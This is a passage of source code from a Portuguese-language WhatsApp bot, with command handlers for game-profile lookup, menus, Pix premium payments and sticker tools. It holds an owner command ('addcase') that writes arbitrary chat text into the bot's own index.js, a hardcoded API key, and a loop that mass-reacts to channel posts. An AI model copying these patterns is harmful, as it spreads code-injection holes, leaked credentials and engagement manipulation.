if (!id) return enviar(`❌ Exemplo: ${prefix}ffstalk 1989445071*`)
reagir(from, '✅');
try {
const res = await fetchJson(`https://zero-two-apis.com.br/api/get/ff-stalk?id=${id}&apikey=natsupremium`)
if (!res.status || !res.resultados) return enviar('❌ Não foi possível obter os dados. Verifique o ID.')

const data = res.resultados
    const {
      id: uid,
      apelido,
      nivel,
      imagem,
      versaoJogo,
      experiencia,
      curtidas,
      regiao,
      biografia,
      passeBooyah,
      guilda
    } = data

const dataCriacao = data.dataCriacao.split(' às')[0];
const ultimoLogin = data.ultimoLogin
  .replace(/^[^\w\d]+/, '').split(' às')[0];

const texto = `
👤 *FREE FIRE PERFIL*

📛 *Apelido:* ${apelido}
🆔 *ID:* ${uid}
🎖 *Nível:* ${nivel}
❤️ *Curtidas:* ${curtidas}
📅 *Criado em:* ${dataCriacao}
🕒 *Último Login:* ${ultimoLogin}
📊 *Experiência:* ${experiencia.formatada}
💸 *passeBooyah:* ${passeBooyah}
📚 *Biografia:*\n${biografia || 'Nenhuma'}

🏅 *Guilda:*
• Nome: ${guilda?.nome || 'Sem guilda'}
• Nível: ${guilda?.nivel || '-'}
• Membros: ${guilda?.membros || '-'}
`;

await safeSendMessage(from, {image: {url: imagem}, caption: texto}, {quoted: non});
} catch (err) {
reagir(from, '❌');
}
}
break

case 'canal':
enviar('https://whatsapp.com/channel/0029Vb8wnIgGJP89En0gSR26')
break

case 'emoji-mix':
case 'emojimix':
case 'emoji2':
var [emj1, emj2] = q.trim().split("+")
if(!q.includes("+")) return enviar(`Olá, está faltando o +\nExemplo: ${prefix+command} 👿+😇`)
try {
reagir(from, "✅");
sendStickerFromUrl(from, `https://zero-two-apis.com.br/api/emojimix?emoji1=${encodeURI(emj1)}&emoji2=${encodeURI(emj2)}&apikey=`+KEY_ZERO)
} catch (e) {
enviar('*Não consegui combinar*')
}
break

case 'ping': {
reagir(from, '⚡️')
r = (Date.now() / 1000) - info.messageTimestamp
var getGroups = await client.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
uptime = process.uptime()
// ${infoSystem.type()}
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
let baseimg
try {
baseimg = await client.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image');
} catch(e) {
baseimg = 'https://i.ibb.co/Z63yzZLH/188320e5-dabd-4056-bafc-80e8e8e8ba31.jpg'
}
const avatar = encodeURIComponent(baseimg);
var ping = `┏═══♚═══╼✪✮✪╾═══♚═══┓
│╭┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╮
┃᨞⁞⏰⃞⃞⚝ *𝙷𝙾𝚁𝙰́𝚁𝙸𝙾:* ${hora1}
┃᨞⁞📅⃞⃞⚝ *𝙳𝙰𝚃𝙰:* ${date}
┃᨞⁞💻⃞⃞⚝ *𝚂𝙸𝚂𝚃𝙴𝙼𝙰:* ${infoSystem.type()}
┃࣪᨞⁞✅⃞⃞⚝ *𝙾𝙽𝙻𝙸𝙽𝙴:* ${kyun(uptime)}
┃᨞⁞🛠️⃞⃞⚝ *𝙲𝙾𝙼𝙰𝙽𝙳𝙾𝚂 𝚃𝙾𝚃𝙰𝙻:* ${totalcmds}
┃࣪᨞⁞💾⃞⃞⚝ *𝙼𝙴𝙼𝙾́𝚁𝙸𝙰:* ${(infoSystem.freemem()/Math.pow(1024,3)).toFixed(2)}/${(infoSystem.totalmem()/Math.pow(1024,3)).toFixed(2)} GB
┃᨞⁞🗂️⃞⃞⚝ *𝙶𝚁𝚄𝙿𝙾𝚂 𝙰𝚃𝙸𝚅𝙾:* [ ${ingfoo.length} ]
│╰┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╯
┗═══♚═══╼✪✮✪╾═══♚═══┛`;
await safeSendMessage(from, {image: {url: `https://neon-apis.shop/canvas/ping?fundo=https://qu.ax/HtiMq.jpg&text=NOLAN&text2=${String(r.toFixed(3))}&text3=LATENCIA&logo=${avatar}`}, caption: ping, buttons: [
{
buttonId: `${prefix}canal`,
buttonText: { displayText: '「 👥️ 」𝐂𝐀𝐍𝐀𝐋「 👥️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
},
{
buttonId: `${prefix}dono`,
buttonText: { displayText: '「 😼 」𝐃𝐎𝐍𝐎「 😼 」' },
type: 1 }], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
}
break

case 'addcase':
if(!SoDono) return enviar('apenas meu dono')
const pula = [fs.readFileSync('index.js', 'utf8').slice(0, fs.readFileSync('index.js', 'utf8').lastIndexOf('break') + 5), q, fs.readFileSync('index.js', 'utf8').slice(fs.readFileSync('index.js', 'utf8').lastIndexOf('break') + 5)].join('\n\n');
fs.writeFileSync('index.js', pula);
enviar('Nova case adicionada com sucesso!')
break

case 'upload':
case 'imgpralink':
case 'midialink':
case 'gerarlink':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
let mediaType = null;
let mediaMessage = null;
if (isMedia) {
if (info.message.imageMessage) {
mediaType = 'image';
mediaMessage = info.message.imageMessage;
} else if (info.message.videoMessage) {
mediaType = 'video';
mediaMessage = info.message.videoMessage;
} else if (info.message.audioMessage) {
mediaType = 'audio';
mediaMessage = info.message.audioMessage;
} else if (info.message.documentMessage) {
mediaType = 'document';
mediaMessage = info.message.documentMessage;
} else if (info.message.stickerMessage) {
mediaType = 'sticker';
mediaMessage = info.message.stickerMessage;
}
} else if (type === 'extendedTextMessage') {
const quoted = info.message.extendedTextMessage.contextInfo?.quotedMessage;
if (quoted?.imageMessage) {
mediaType = 'image';
mediaMessage = quoted.imageMessage;
} else if (quoted?.videoMessage) {
mediaType = 'video';
mediaMessage = quoted.videoMessage;
} else if (quoted?.audioMessage) {
mediaType = 'audio';
mediaMessage = quoted.audioMessage;
} else if (quoted?.documentMessage) {
mediaType = 'document';
mediaMessage = quoted.documentMessage;
} else if (quoted?.stickerMessage) {
mediaType = 'sticker';
mediaMessage = quoted.stickerMessage;
}
}
if (!mediaType || !mediaMessage) {
enviar('Você precisa marcar ou enviar uma imagem, vídeo, áudio, documento ou figurinha abaixo de 200MB.');
return;
}
const sizeLimitOk = mediaType === 'sticker' || mediaMessage.fileLength < 209715200;
if (sizeLimitOk) {
const buffer = await getFileBuffer(mediaMessage, mediaType);
await sleep(1000);
const emoji = {
image: "📷",
video: "🎥",
audio: "🎧",
document: "📄",
sticker: "🖼️"
}[mediaType] || "📎";
reagir(from, emoji);
const souh = await upload(buffer);
enviar(souh);
} else {
reagir(from, "❗");
enviar('O gerador de link só funciona com mídias abaixo de 200MB.');
}
break;
  
case 'take':
setTimeout(() => {reagir(from, "✅")}, 300)
if(!isQuotedSticker) return enviar('Marque uma figurinha...')
i8 = rgtake.map(i => i.usuario).indexOf(sender)
if(i8 < 0) return enviar(`Você ainda não definiu a sua marca ďágua personalizada para o uso desse comando.\n• Por favor, use o comando *rgtake sb|bot* para registrar sua marca ďagua personalizada de seus stickers.`)
renameContextSticker(rgtake[i8].mcdagua1, rgtake[i8].mcdagua2, `RENOMEADA COM SUCESSO`, info)
.catch((err) => {
enviar(`❌ Erro, tente mais tarde`); 
})
break

case 'rgtake':
var [TP, TP2] = q.split("|")
rgtakergtake = []
for (i of rgtake) {rgtakergtake.push(i.usuario)}
if(rgtakergtake.indexOf(sender) >= 0) return enviar(`Você já registrou sua marca ďagua, se deseja substituir use *rntake name|autor*`)
if(!q.includes("|")) return enviar(`🔹 Uso correto: *${prefix + command} sb|bot*`)
if(!TP) return enviar(`Você esqueceu de preencher o primeiro campo... Ex: *${prefix + command} sb|bot*`)
if(!TP2) return enviar(`Você esqueceu de preencher o segundo campo... Ex: *${prefix + command} sb|bot*`)
rgtake.push({usuario: sender, mcdagua1: TP, mcdagua2: TP2})
fs.writeFileSync("./banco de dados/usuarios/take.json", JSON.stringify(rgtake, null, 2))
enviar(`Sucesso ao concluir o registro... Agora você pode usar o comando: *${prefix}take*`)
break

case 'rntake':
i8 = rgtake.map(i => i.usuario).indexOf(sender)
if(i8 < 0) return enviar(`Como você quer renomear algo que você não tem registro?`)
if(!q.includes("|")) return enviar(`🔹 Uso correto: *${prefix + command} sb|bot*`)
var [MARCAD1, MARCAD2] = q.split("|")
if(!MARCAD1) return enviar(`Você esqueceu de preencher o primeiro campo... Ex: *${prefix + command} sb|bot*`)
if(!MARCAD2) return enviar(`Você esqueceu de preencher o segundo campo... Ex: *${prefix + command} sb|bot*`)
rgtake[i8].mcdagua1 = MARCAD1
rgtake[i8].mcdagua2 = MARCAD2
fs.writeFileSync("./banco de dados/usuarios/take.json", JSON.stringify(rgtake, null, 2) + '\n')
enviar(`Sua marca ďágua foi alterada para *"${MARCAD1}|${MARCAD2}"* com sucesso.`)
break

case 'xchannel': {
if (!q) return enviar(`🔹 Uso correto: ${prefix + command} link texto`);
const hurufGaya = {
a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖', h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝', o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤', v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩', A: '🅐', B: '🅑', C: '🅒', D: '🅓', E: '🅔', F: '🅕', G: '🅖', H: '🅗', I: '🅘', J: '🅙', K: '🅚', L: '🅛', M: '🅜', N: '🅝', O: '🅞', P: '🅟', Q: '🅠', R: '🅡', S: '🅢', T: '🅣', U: '🅤', V: '🅥', W: '🅦', X: '🅧', Y: '🅨', Z: '🅩', '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍', '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒', '!': '❗', '?': '❓', '+': '➕', '-': '➖', '=': '🟰', '*': '✳️', '/': '➗', '#': '#️⃣', '@': '✉️', '&': '⚓', '$': '💲', '%': '🔢', '^': '🔼', '(': '❨', ')': '❩', '[': '❴', ']': '❵', '{': '⦃', '}': '⦄', '<': '«', '>': '»', '.': '•', ',': '‚', ':': '꞉', ';': '⁏', '"': '❝', '\'': '❛', '❤': '❤️', '☆': '★', '♡': '♥', '→': '➡️', '←': '⬅️', '↑': '⬆️', '↓': '⬇️', '|': '⎜', '_': '▁', '~': '〰️', ' ': '―'
};
const [mainText, offsetStr] = q.split('|');
const args = mainText.trim().split(" ");
const link = args[0];
if (!link.includes("https://whatsapp.com/channel/")) {
return enviar(`⚠️ *Link inválido!*\nUse o formato correto:\n${prefix + command} https://whatsapp.com/channel/9999999 yattin domina`);
}
const channelId = link.split('/')[4];
const rawMessageId = parseInt(link.split('/')[5]);
if (!channelId || isNaN(rawMessageId)) return enviar("❌ *Link incompleto!*");

 const offset = parseInt(offsetStr?.trim()) || 1;
const textoNormal = args.slice(1).join(' ');
const textoSemLink = textoNormal.replace(link, '').trim();
if (!textoSemLink) return enviar("❗ *Digite o texto/emoji para reagir!*");
const emoji = textoSemLink.split('').map(c => hurufGaya[c] || c).join('');
try {
const metadata = await client.newsletterMetadata("invite", channelId);
let sucesso = 0, falha = 0;
for (let i = 0; i < offset; i++) {
const msgId = (rawMessageId - i).toString();
try {
await client.newsletterReactMessage(metadata.id, msgId, emoji);
sucesso++;
} catch (e) {
falha++;
}
}
reagir(from, '✅️')
} catch (err) {
console.error(err);
reagir(from, '❌')
enviar("❌ *Ocorreu um erro ao processar o pedido!*");
}
}
break;

case 'menu':
reagir(from, "✅");
await client.relayMessage(from, {interactiveMessage: {header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({image: {url: ftmenu.logo}}, {upload: client.waUploadToServer})), hasMediaAttachment: false, title: `┏═══♚═══╼✪✮✪╾═══♚═══┓
│╭┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╮
│᨞⁞🪼 𝙽𝙾𝙼𝙴: ${NomeDoBot}
│᨞⁞💠 𝚄𝚂𝙴𝚁: ${sender.split("@")[0]}
│᨞⁞🪼 𝙿𝚁𝙴𝙵𝙸𝚇𝙾: [ ${prefix} ]
│᨞⁞🪼 𝙿𝚁𝙴𝙼𝙸𝚄𝙼: [ ${isChVip} ] 
│᨞⁞💠 𝙷𝙾𝚁𝙰𝚁𝙸𝙾: ${hora}
│᨞⁞💠 𝙲𝙾𝙼𝙰𝙽𝙳𝙾𝚂: ${totalcmds}
│╰┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╯
┗═══♚═══╼✪✮✪╾═══♚═══┛`}), body: { text: "" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "「 💙 」𝐓𝐎𝐃𝐀𝐒 𝐎𝐏𝐂「 💙 」",
sections: [
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "「 🌐 」𝐌𝐞𝐧𝐮 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐨「 🌐 」",
description: "𝖳𝗈𝖽𝗈𝗌 𝗈𝗌 𝖼𝗈𝗆𝖺𝗇𝖽𝗈𝗌 𝖽𝗂𝗌𝗉𝗈𝗇𝗂𝗏𝖾𝗂𝗌.",
id: `${prefix}menuc`,
disabled: false
}
]
},
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "️「 🔐 」𝐌𝐞𝐧𝐮 𝐃𝐨 𝐂𝐫𝐢𝐚𝐝𝐨𝐫「 🔐 」",
description: "𝖢𝗈𝗆𝖺𝗇𝖽𝗈𝗌 𝗋𝖾𝗌𝗍𝗋𝗂𝗍𝗈𝗌 𝖺𝗈 𝖽𝗈𝗇𝗈.",
id: `${prefix}menudono`,
disabled: false
}
]
},
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "「 ⚙️ 」𝐌𝐞𝐧𝐮 𝐀𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫「 ⚙️ 」",
description: "𝖦𝖾𝗋𝖾𝗇𝖼𝗂𝖺𝗆𝖾𝗇𝗍𝗈 𝖾 𝗆𝗈𝖽𝖾𝗋𝖺𝖼𝖺𝗈.",
id: `${prefix}menuadm`,
disabled: false
}
]
},
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "「 🎗 」𝐌𝐞𝐧𝐮 𝐂𝐦𝐝 𝐏𝐫𝐞𝐦𝐢𝐮𝐦「 🎗 」",
description: "𝖱𝖾𝖼𝗎𝗋𝗌𝗈𝗌 𝖾𝗑𝖼𝗅𝗎𝗌𝗂𝗏𝗈𝗌 𝗎𝗌𝗎𝖺𝗋𝗂𝗈𝗌 𝖵𝖨𝖯.",
id: `${prefix}premium`,
disabled: false
}
]
},
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "「 📱 」𝐌𝐞𝐧𝐮 𝐀𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐯𝐨 𝐌𝐨𝐝「 📱 」",
description: "𝖠𝗉𝗅𝗂𝖼𝖺𝗍𝗂𝗏𝗈𝗌 𝗉𝗋𝖾𝗆𝗂𝗎𝗆 𝗌𝖾𝗆 𝖺𝗇𝗎𝗇𝖼𝗂𝗈.",
id: `${prefix}menuapps`,
disabled: false
}
]
},
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "「 🎨 」𝐌𝐞𝐧𝐮 𝐋𝐨𝐠𝐨𝐬 𝐈𝐦𝐚𝐠𝐞𝐧𝐬「 🎨 」",
description: "𝖨𝗆𝖺𝗀𝖾𝗇𝗌 𝗉𝖺𝗋𝖺 𝗉𝖾𝗋𝖿𝗂𝗅 𝗈𝗎 𝗐𝖺𝗅𝗅𝗉𝖺𝗉𝖾𝗋.",
id: `${prefix}menulogos`,
disabled: false
}
]
},
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "「 🤡 」𝐌𝐞𝐧𝐮 𝐃𝐞 𝐁𝐫𝐢𝐧𝐜𝐚𝐝𝐞𝐢𝐫𝐚「 🤡 」",
description: "𝖢𝗈𝗆𝖺𝗇𝖽𝗈𝗌 𝖽𝖾 𝗓𝗈𝖾𝗂𝗋𝖺 𝗉𝖺𝗌𝗌𝖺-𝗍𝖾𝗆𝗉𝗈.",
id: `${prefix}brincadeira`,
disabled: false
}
]
},
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "「 😈 」𝐌𝐞𝐧𝐮 𝐇𝐞𝐧𝐭𝐚𝐢𝐬 𝐀𝐧𝐢𝐦𝐞𝐬「 😈 」",
description: "𝖢𝗈𝗆𝖺𝗇𝖽𝗈𝗌 𝖽𝖾 𝗂𝗆𝖺𝗀𝖾𝗇𝗌 𝗉𝗈𝗋𝗇𝗈.",
id: `${prefix}menuhentai`,
disabled: false
}
]
},
{
title: `${NomeDoBot}`,
highlight_label: "💙",
rows: [
{
title: "「 🗂 」𝐌𝐞𝐧𝐮 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬「 🗂 」",
description: "𝖸𝗈𝗎𝖳𝗎𝖻𝖾, 𝗍𝗂𝗄𝗍𝗈𝗄, 𝗆𝗎𝗌𝗂𝖼𝖺𝗌 𝖾 𝗆𝖺𝗂𝗌.",
id: `${prefix}downloads`,
disabled: false
}
]
}
]
}),
messageParamsJson: ""
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"「 ☁️ 」𝐇𝐎𝐒𝐓 𝐒𝐂𝐀𝐋𝐄「 ☁️ 」\",\"url\":\"https://hostscale.shop\",\"merchant_url\":\"https://hostscale.shop\"}"
}
]
}
}
}, {quoted: non});
break;

case 'menuc':
await escrever()
await randomreact();
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.menu(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menudono`,
buttonText: { displayText: '「 😼 」𝐌𝐄𝐍𝐔𝐃𝐎𝐍𝐎「 😼 」' },
type: 1
},
{
buttonId: `${prefix}menuadm`,
buttonText: { displayText: '「 ⚙️ 」𝐌𝐄𝐍𝐔𝐀𝐃𝐌「 ⚙️ 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
break

case 'verificarbots': 
if(!SoDono) return enviar(arise.donosmt)
reagir(from, '😺')
const resposta = verificarBots();
await safeSendMessage(from, {text: resposta}, {quoted: non});
break

case 'comprarpremium': {
if (!q) return enviar(`❌ Informe quantos dias deseja.\nEx: ${prefix}comprarpremium 30`);
const dias = parseInt(q);
if (isNaN(dias) || dias < 1 || dias > 90) return enviar("❌ Quantidade de dias inválida.");
reagir(from, "✅");

const valorPorDia = 0.45;
const total = dias * valorPorDia;

const pagamentos = lerJSON('./exports/funcoes/pagamentosPremium.json');
const idempotencyKey = gerarIdUnico();

try {
const res = await axios.post("https://api.mercadopago.com/v1/payments", {
transaction_amount: total,
payment_method_id: "pix",
description: `Premium por ${dias} dia(s)`,
payer: {email: "comprador@email.com"}
}, {
headers: {
Authorization: `Bearer ${TOKEN_MERCADO_PAGO}`,
'Content-Type': 'application/json',
'X-Idempotency-Key': idempotencyKey
}
});

const pagamento = res.data;
const copiaCola = pagamento.point_of_interaction.transaction_data.qr_code;
const qrBase64 = pagamento.point_of_interaction.transaction_data.qr_code_base64;

pagamentos[sender] = {
id: pagamento.id,
dias,
status: "pendente",
criado: Date.now()
};
salvarJSON('./exports/funcoes/pagamentosPremium.json', pagamentos);

const texto = `💫 *RECURSO PREMIUM* 💫

• Quantidade de dias: [ ${dias} ]
• Custo calculado: R$${total.toFixed(2)}

Após o pagamento, clique em *verificar* ou use ${prefix}verificarpremium para receber automaticamente.

Use o QR Code ou copie:`;

await client.relayMessage(from, {
interactiveMessage: {
header: {
hasMediaAttachment: true,
imageMessage: (await prepareWAMessageMedia({ image: Buffer.from(qrBase64, 'base64')}, { upload: client.waUploadToServer})).imageMessage
},
headerType: 'IMAGE',
body: {text: texto},
footer: {text: `${NomeDoBot}`},
nativeFlowMessage: {
buttons: [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "「 💸 」𝐂𝐎𝐏𝐈𝐀𝐑 𝐏𝐈𝐗「 💸 」",
copy_code: copiaCola
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "「 ✅️ 」𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑「 ✅️ 」",
id: `${prefix}verificarpremium`
})
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"「 ☁️ 」𝐇𝐎𝐒𝐓 𝐒𝐂𝐀𝐋𝐄「 ☁️ 」\",\"url\":\"https://hostscale.shop\",\"merchant_url\":\"https://hostscale.shop\"}"
}
],
messageParamsJson: ""
},
contextInfo: {
participant: sender,
quotedMessage: info,
isForwarded: true
}
}
}, {});
} catch (err) {
console.log(err.response?.data || err);
enviar("❌ Erro ao gerar o pagamento.");
}
}
break;


case 'verificarpremium': {
const pagamentos = lerJSON('./exports/funcoes/pagamentosPremium.json');
const premium = lerJSON('./banco de dados/usuarios/premium.json');
// Limpa pagamentos pendentes com mais de 5 minutos
for (const user in pagamentos) {
const registro = pagamentos[user];
if (registro.status === "pendente" && registro.criado && (Date.now() - registro.criado > 5 * 60 * 1000)) {
delete pagamentos[user];
}
}
salvarJSON('./exports/funcoes/pagamentosPremium.json', pagamentos);

const info = pagamentos[sender];
if (!info) return enviar("❌ Nenhum pagamento encontrado.");
try {
const res = await axios.get(`https://api.mercadopago.com/v1/payments/${info.id}`, {
headers: { Authorization: `Bearer ${TOKEN_MERCADO_PAGO}` }
});

const status = res.data.status;

if (status === "approved") {

const jaTem = premium.find(u => u.id === sender);
if (jaTem) {
jaTem.dias += info.dias;
} else {
premium.push({
id: sender,
dias: info.dias,
save: Number(moment.tz('America/Sao_Paulo').format('DD')),
infinito: false
});
}

fs.writeFileSync('./banco de dados/usuarios/premium.json', JSON.stringify(premium, null, 2));

enviar(`✅ *Pagamento confirmado!*\nVocê recebeu *${info.dias} dias* de premium.`);

safeSendMessage(nmrdn, {text: `✅ *Novo premium ativado!*

• Usuário: wa.me/${sender.split("@")[0]}
• Dias: ${info.dias}`}, {quoted: non});
reagir(from, "✅");
await sleep(800)
delete pagamentos[sender];
salvarJSON('./exports/funcoes/pagamentosPremium.json', pagamentos);
setTimeout(() => process.exit(0), 2000);
} else {
safeSendMessage(from, {text: `⌛ Pagamento ainda não aprovado.`, buttons: [
{
buttonId: `${prefix}verificarpremium`,
buttonText: { displayText: '「 ✅️ 」𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑「 ✅️ 」' },
type: 1 }], headerType: 1, viewOnce: true}, {quoted: non});
reagir(from, "❌");
}
} catch (err) {
console.log(err.response?.data || err);
enviar("❌ Erro ao verificar o pagamento.");
}
}
break;

case 'copiarpixpremium': {
const pagamentos = lerJSON('./exports/funcoes/pagamentosPremium.json');
const info = pagamentos[sender];
if (!info) return enviar("❌ Nenhum Pix gerado ainda.");
const res = await axios.get(`https://api.mercadopago.com/v1/payments/${info.id}`, {
headers: { Authorization: `Bearer ${TOKEN_MERCADO_PAGO}` }
});

const copia = res.data.point_of_interaction.transaction_data.qr_code;
enviar(`${copia}`);
}
break;

case 'verificado-global': 
if(!SoDono) return enviar(arise.donosmt)
if(!isVerificado) {
nescessario.verificado = true
setNes(nescessario)
enviar("O verificado foi desativado com sucesso, ou seja, o selo foi retirado de todos os meus comandos! *Para reativar é só digitar o comando novamente.*")
} else if(isVerificado) {
nescessario.verificado = false
setNes(nescessario)
enviar(`O verificado foi ativado, ou seja, o selo foi colocado em todos os meus comandos! *Para remover o verificado dos comandos, use o comando novamente.*`) 
}
break

case 'menuadm':
case 'menuadms':
await escrever()
await randomreact();
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.adms(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menuapps`,
buttonText: { displayText: '「 📱 」𝐌𝐄𝐍𝐔𝐀𝐏𝐏「 📱 」' },
type: 1
},
{
buttonId: `${prefix}brincadeira`,
buttonText: { displayText: '「 🤡 」𝐙𝐎𝐄𝐈𝐑𝐀𝐒「 🤡 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
break 

case 'menudono':
case 'donomenu':
await escrever()
await randomreact();
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.dono(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menupremium`,
buttonText: { displayText: '「 🎗 」𝐏𝐑𝐄𝐌𝐈𝐔𝐌「 🎗 」' },
type: 1
},
{
buttonId: `${prefix}menuapps`,
buttonText: { displayText: '「 📱 」𝐌𝐄𝐍𝐔𝐀𝐏𝐏「 📱 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non})
break 

case 'dono': case 'criador': case 'suporte-dono':
  let vcard = `BEGIN:VCARD\n`
    + `VERSION:3.0\n`
    + `N:;yato;;;\n`
    + `FN:${NickDono}\n`
    + `item1.TEL;waid=${nmrdnofc1}:${nmrdnofc1}\n`
    + `item1.X-ABLabel:Transformando o café em código.\n`
    + `END:VCARD`;
safeSendMessage(from, {contacts: {displayName: `${NickDono}`, contacts: [{ vcard }]}, contextInfo: {forwardingScore: 999, isForwarded: true}});
break;

case 'zoeiras':
case 'zoeira':
case 'brincadeira':
if(!isModobn) return enviar(arise.brincadeira)   
await escrever()
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.zoeiras(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menuadm`,
buttonText: { displayText: '「 ⚙️ 」𝐌𝐄𝐍𝐔𝐀𝐃𝐌「 ⚙️ 」' },
type: 1
},
{
buttonId: `${prefix}menulogos`,
buttonText: { displayText: '「 🎨 」𝐌𝐄𝐍𝐔𝐋𝐎𝐆𝐎「 🎨 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non})
break 

case 'menupremium':
case 'premium':
await escrever()
await randomreact();
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.premium(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menuhentai`,
buttonText: { displayText: '「 🥵 」𝐇𝐄𝐍𝐓𝐀𝐈𝐒「 🥵 」' },
type: 1
},
{
buttonId: `${prefix}downloads`,
buttonText: { displayText: '「 🗂 」𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃「 🗂 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non})
break

case 'destrava':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
safeSendMessage(from, {text: destrava}, {quoted: non})
break

case 'sethorario':
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if (!args[0] || !args[1]) return enviar(`Use: ${prefix + command} 22:00 06:00`);
const fecharH = args[0]; // horário para fechar
const abrirH = args[1];  // horário para abrir
const pathHorario = `./banco de dados/grupos/games/${from}.json`;
const horarioData = {
groupId: from,
fechar: fecharH,
abrir: abrirH,
ativo: true,
ultimo: ""
};
fs.writeFileSync(pathHorario, JSON.stringify(horarioData, null, 2));
await enviar(`⏰️ 𝗛𝗢𝗥𝗔𝗥𝗜𝗢 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗔𝗗𝗢:\n𝗙𝗘𝗖𝗛𝗔𝗥: *${fecharH}* - 𝗔𝗕𝗥𝗜𝗥: *${abrirH}*`);
break;

case 'perfil': {
reagir(from, '✅️');
let ppimg;
try {
ppimg = await client.profilePictureUrl(sender, 'image');
} catch {
ppimg = 'https://qu.ax/eRUFw.jpg';
}
let status;
try {
status = (await client.fetchStatus(sender)).status;
} catch {
status = "Privado ou indefinido.";
}
const conselho = palavrasc[Math.floor(Math.random() * palavrasc.length)];
const nivelGado = Math.floor(Math.random() * 100);
const nivelPuta = Math.floor(Math.random() * 100);
const nivelGostoso = Math.floor(Math.random() * 100);
const programa = Math.ceil(Math.random() * 10000);
const infous = DonoOficial ? "Owner supreme" : "Member common";
const texto = `🪪 *CARTÃO DIGITAL ONLY*

